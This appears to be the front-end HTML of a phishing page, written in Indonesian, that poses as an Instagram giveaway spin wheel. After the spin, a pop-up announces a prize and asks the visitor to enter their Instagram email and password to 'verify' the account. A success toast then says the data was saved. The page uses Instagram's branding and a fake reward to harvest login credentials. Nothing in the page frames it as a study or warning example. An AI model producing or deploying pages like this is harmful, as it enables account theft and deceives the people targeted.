<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giveaway Spin Wheel</title>
    <link rel="stylesheet" href="style.css">
    <!-- FontAwesome untuk Icon Notifikasi -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <h1>#INSTAGIVEAWAY2026</h1>
        <p>Putar roda dan menangkan hadiah menarik!</p>
        
        <div class="spin-wheel-outer-container">
            <div class="pointer"></div> 
            <div class="wheel-canvas-container">
                <canvas id="wheel" width="500" height="500"></canvas>
                <div class="center-circle">
    <!-- Mengganti insta-dot lama dengan ikon resmi Instagram dari FontAwesome -->
    <i class="fa-brands fa-instagram wheel-center-icon"></i>
</div>
            </div>
        </div>
        
        <button id="spinBtn">SPIN!</button>
        
        <div id="result">
            <p id="winningMessage"></p>
        </div>
    </div>

    <!-- ====== POP-UP MODAL CARD ====== -->
    <div class="modal-overlay" id="registerModal">
        <div class="modal-card">
            <div class="modal-header">
                <i class="fa-brands fa-instagram instagram-icon"></i>
                <h2>Klaim Hadiah Anda!</h2>
                <p>Selamat! Anda memenangkan <span id="giftName"></span>. Silakan verifikasi akun untuk memproses pengiriman.</p>
            </div>
            <form id="claimForm">
                <div class="input-group">
                    <i class="fa-solid fa-envelope"></i>
                    <input type="email" id="userEmail" placeholder="Masukkan Email Instagram" required>
                </div>
                <div class="input-group">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" id="userPassword" placeholder="Masukkan Password" required>
                </div>
                <button type="submit" id="submitClaimBtn">Konfirmasi Klaim</button>
            </form>
        </div>
    </div>

    <!-- ====== KOTAK NOTIFIKASI ====== -->
    <div class="notification-toast" id="notification">
        <div class="toast-content">
            <i class="fa-solid" id="toastIcon"></i>
            <div class="toast-message">
                <span class="toast-title" id="toastTitle">Sukses</span>
                <span class="toast-desc" id="toastDesc">Data berhasil disimpan.</span>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
